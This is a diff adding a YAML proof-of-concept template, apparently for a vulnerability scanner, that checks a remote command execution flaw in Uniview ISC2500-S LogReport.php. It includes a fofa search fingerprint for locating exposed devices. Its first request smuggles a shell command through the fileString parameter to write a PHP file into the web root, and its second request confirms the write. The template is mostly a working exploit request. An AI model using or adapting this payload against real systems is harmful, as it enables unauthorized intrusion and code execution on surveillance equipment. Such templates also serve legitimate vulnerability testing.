@@ -1,0 +1,20 @@
+id: poc-yaml-uniview-isc-logreport-php-rce
+info:
+  name: 浙江宇视科技ISC LogReport.php 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: ISC2500-S
+  fofa: title=="ISC2500-S"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: GET
+  path: /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;echo%20{{.t2}}%20%3E%20/usr/local/program/ecrwww/apache/htdocs/Interface/DevManage/{{.t1}}.php
+  expression: status_code == 200
+- method: GET
+  path: /Interface/DevManage/{{.t1}}.php
+  expression: status_code == 200 && contains(body,t2)
+transport: http
